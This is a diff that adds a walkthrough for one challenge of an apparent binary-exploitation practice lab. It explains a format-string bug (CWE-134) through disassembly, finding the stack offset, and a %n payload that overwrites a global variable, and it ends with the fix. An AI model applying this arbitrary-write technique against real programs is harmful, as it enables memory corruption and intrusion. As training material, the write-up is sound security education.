@@ -444,8 +444,48 @@ the next chunk's header turns `free()` into an arbitrary write. Modern allocator
 
 ---
 
-<!-- ex07 … ex11 walkthroughs are added as each challenge is completed. -->
-_ex07 … ex11: in progress._
+### ex07 — format string: write a value with `%n`
+
+**Goal (`README.txt`):** see *“you have modified the target :)”*.
+
+**Vulnerability class:** format-string vulnerability (CWE-134) — `printf(user_input)` with no fixed
+format — used to perform an arbitrary memory write via `%n`.
+
+**Disassembly (`vuln`):**
+
+```asm
+ 8048477: call   fgets@plt            ; fgets(buf[ebp-0x208], 0x200, stdin)
+ 8048485: call   printf@plt           ; printf(buf)   <-- user controls the FORMAT
+ 804848a: mov    eax,ds:0x80496e4     ; eax = target (global)
+ 804848f: cmp    eax,0x40             ; target == 0x40 ?
+ 8048494: ... puts("you have modified the target :)")
+```
+
+**Reading it:** `printf` is called with **one** argument — the user buffer — so the buffer is the
+format string. `target` is a global at `0x080496e4`; we need it to equal `0x40` (64).
+
+**Finding the offset.** Feeding `AAAA.%x.%x.%x.%x…` prints `…41414141…` as the **4th** value,
+so our buffer begins at `printf` argument **#4**; `%4$n` therefore writes to the pointer we place
+at the start of the buffer.
+
+**Exploit (`scripts/ex07.py`):** `p32(&target) + "%60d" + "%4$n"`.
+`%n` writes the number of characters printed so far: `4` (the address bytes) `+ 60` (the padded
+`%60d`) `= 64 = 0x40`, written into `target`.
+
+```bash
+python3 scripts/ex07.py | /opt/hole-in-bin/ex07/bin
+```
+
+**Result (verified):** `you have modified the target :)`.
+
+**Key takeaway:** never pass user data as a format string. `%n` turns a "harmless" logging bug into
+an **arbitrary write**: the attacker chooses both the address (placed in the buffer) and the value
+(controlled by the printed width). The fix is trivial: `printf("%s", buf)`.
+
+---
+
+<!-- ex08 … ex11 walkthroughs are added as each challenge is completed. -->
+_ex08 … ex11: in progress._
 
 ---
 
